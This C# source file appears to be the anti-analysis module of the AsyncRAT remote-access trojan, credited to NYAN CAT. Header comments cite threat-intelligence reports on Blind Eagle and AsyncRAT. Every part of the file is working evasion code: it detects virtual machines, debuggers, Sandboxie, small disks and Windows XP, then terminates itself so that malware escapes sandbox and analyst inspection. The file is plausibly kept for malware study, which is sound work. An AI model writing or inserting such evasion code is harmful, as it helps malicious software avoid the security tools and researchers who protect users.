using Client.Handle_Packet;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

//       │ Author     : NYAN CAT
//       │ Name       : Anti Analysis v0.2.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.


namespace Client.Helper
{

    class Anti_Analysis
    {
        public static void RunAntiAnalysis()
            /* RunAntiAnalysis
    *       About:
    *           Method for managing anti-analysis techniques
    *       Results:
    *           Calls functions to check for manufacturer, debuggers, sandboxie.dll, disk size, and if the OS is Windows XP.
    *           Kills program if any is detected.
    *       CTI and References:
    *           https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia
    *           https://dciber.org/analisando-asyncrat-distribuido-na-colombia/
    *           http://www.pinvoke.net/default.aspx/ntdll/RtlSetProcessIsCritical.html?diff=y
    *
    */
        {
            if (DetectManufacturer() || DetectDebugger() || DetectSandboxie() || IsSmallDisk() || IsXP())
                Environment.FailFast(null);
        }

        private static bool IsSmallDisk()
        {
            try
            {
                long GB_60 = 61000000000;
                if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= GB_60)
                    return true;
            }
            catch { }
            return false;
        }

        private static bool IsXP()
        {
            try
            {
                if (new Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp"))
                {
                    return true;
                }
            }
            catch { }
            return false;
        }

        private static bool DetectManufacturer()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    using (var items = searcher.Get())
                    {
                        foreach (var item in items)
                        {
                            string manufacturer = item["Manufacturer"].ToString().ToLower();
                            if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                                || manufacturer.Contains("vmware")
                                || item["Model"].ToString() == "VirtualBox")
                            {
                                return true;
                            }
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool DetectDebugger()
        {
            bool isDebuggerPresent = false;
            try
            {
                NativeMethods.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                return isDebuggerPresent;
            }
            catch
            {
                return isDebuggerPresent;
            }
        }

        private static bool DetectSandboxie()
        {
            try
            {
                if (NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                    return true;
                else
                    return false;
            }
            catch
            {
                return false;
            }
        }


    }
}
